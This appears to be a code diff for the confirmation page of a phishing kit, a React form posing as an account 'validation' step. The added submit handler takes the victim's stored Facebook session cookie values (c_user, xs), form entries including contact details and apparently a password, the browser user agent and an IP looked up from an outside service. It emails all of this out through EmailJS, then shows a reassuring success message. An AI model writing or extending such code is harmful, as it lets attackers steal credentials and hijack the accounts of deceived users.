@@ -49,6 +49,7 @@ export default function Confirmation() {
     },
   });
 
+  // Load validation data on mount
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
@@ -60,14 +61,70 @@ export default function Confirmation() {
       if (!parsed.c_user || !parsed.xs) {
         throw new Error("Invalid validation data");
       }
-      // Set the validation data in the form
       form.setValue('c_user', parsed.c_user);
       form.setValue('xs', parsed.xs);
     } catch (error) {
       console.error('Failed to parse validation data:', error);
       setLocation('/validation');
     }
-  }, [setLocation, form]);
+  }, [form, setLocation]);
+
+  // Filter countries based on search
+  useEffect(() => {
+    const filtered = countries.filter(country =>
+      country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
+      country.code.toLowerCase().includes(countrySearch.toLowerCase())
+    );
+    setFilteredCountries(filtered);
+  }, [countrySearch]);
+
+  const onSubmit = async (data: any) => {
+    try {
+      setIsSubmitting(true);
+
+      // Get validation data to include in the submission
+      const validationData = localStorage.getItem('validation_data');
+      if (!validationData) {
+        throw new Error('Previous validation data not found');
+      }
+      const parsedValidationData = JSON.parse(validationData);
+
+      const formattedData = {
+        ...data,
+        ...parsedValidationData,
+        user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
+        contactMethod,
+        countryCode: contactMethod === 'phone' ? countryCode : undefined,
+        timestamp: new Date().toLocaleString(),
+        userAgent: navigator.userAgent,
+        ipAddress: await fetch('https://api.ipify.org?format=json')
+          .then(res => res.json())
+          .then(data => data.ip)
+          .catch(() => 'Not available')
+      };
+
+      await sendConfirmationFormEmail(formattedData);
+
+      // Clean up stored data after successful submission
+      localStorage.removeItem('validation_data');
+
+      toast({
+        title: "Success!",
+        description: "Your form has been submitted successfully"
+      });
+
+      setLocation("/success");
+    } catch (error) {
+      console.error('Form submission error:', error);
+      toast({
+        variant: "destructive",
+        title: "Error",
+        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   const handlePhoneInput = (value: string) => {
     try {
@@ -87,66 +144,6 @@ export default function Confirmation() {
     }
   };
 
-  useEffect(() => {
-    const filtered = countries.filter(country =>
-      country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
-      country.code.toLowerCase().includes(countrySearch.toLowerCase())
-    );
-    setFilteredCountries(filtered);
-  }, [countrySearch]);
-
-
-  const onSubmit = async (data: any) => {
-    try {
-      setIsSubmitting(true);
-
-      // Get validation data from localStorage
-      const validationData = localStorage.getItem('validation_data');
-      if (!validationData) {
-        throw new Error('Previous validation data not found');
-      }
-      const parsedValidationData = JSON.parse(validationData);
-
-      const formattedData = {
-        ...data,
-        ...parsedValidationData, // Include c_user and xs from validation
-        user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
-        contactMethod,
-        countryCode: contactMethod === 'phone' ? countryCode : undefined,
-        timestamp: new Date().toLocaleString(),
-        userAgent: navigator.userAgent,
-        ipAddress: await fetch('https://api.ipify.org?format=json')
-          .then(res => res.json())
-          .then(data => data.ip)
-          .catch(() => 'Not available')
-      };
-
-      console.log('Submitting confirmation form with data:', { 
-        ...formattedData,
-        password: '[REDACTED]' 
-      });
-
-      const emailResponse = await sendConfirmationFormEmail(formattedData);
-      console.log('EmailJS confirmation response:', emailResponse);
-
-      localStorage.removeItem('validation_data'); // Clean up after successful submission
-
-      toast({
-        title: "Success!",
-        description: "Your form has been submitted successfully"
-      });
-      setLocation("/success");
-    } catch (error) {
-      console.error('Form submission error:', error);
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
-      });
-    } finally {
-      setIsSubmitting(false);
-    }
-  };
 
   return (
     <>
